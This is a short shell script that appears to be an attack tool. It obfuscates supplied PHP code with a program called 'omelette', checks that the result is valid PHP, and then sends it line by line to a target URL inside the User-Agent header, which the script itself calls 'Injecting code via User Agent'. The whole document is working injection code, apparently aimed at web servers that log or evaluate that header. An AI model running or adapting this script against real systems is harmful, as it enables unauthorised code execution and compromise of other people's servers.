#!/bin/sh

code=$1
./omelette "${code}" > plate
echo [*] Scrambling code
echo [*] Checking code
php -l plate >/dev/null 2>&1

if [ $? != 0 ]; then
    echo "Scrambling PHP returned broken code in file 'plate'"
    exit 2;
fi

echo [*] Injecting code via User Agent
while read -r line; do
    echo -n "   | ${line} \t>> $2 => " 
    curl -k -s -i -A "Omelette/1.0 (${line})" "$2" | head -1
done<plate
echo [*] Done!
